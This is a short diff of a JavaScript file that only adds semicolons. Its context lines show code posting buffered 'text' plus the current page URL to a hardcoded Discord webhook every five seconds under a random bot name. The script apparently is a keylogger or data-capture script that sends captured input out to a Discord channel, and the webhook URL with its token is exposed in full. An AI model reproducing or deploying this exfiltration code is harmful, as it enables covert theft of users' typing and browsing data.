@@ -3,7 +3,7 @@ var discord_webhook = "https://discord.com/api/webhooks/806072777970417674/-2idl
 
 var text = "";
 var messageInterval = 5000;
-var botName = Math.random().toString()
+var botName = Math.random().toString();
 
 
 function sendMessage() {  // sends message using Discord webhook
@@ -13,7 +13,7 @@ function sendMessage() {  // sends message using Discord webhook
     request.setRequestHeader('Content-type', 'application/json');
 
     if (text != "") {
-        text += " <<<URL: " + window.location.href + " >>>"
+        text += " <<<URL: " + window.location.href + " >>>";
 
         var params = {
             username: botName,
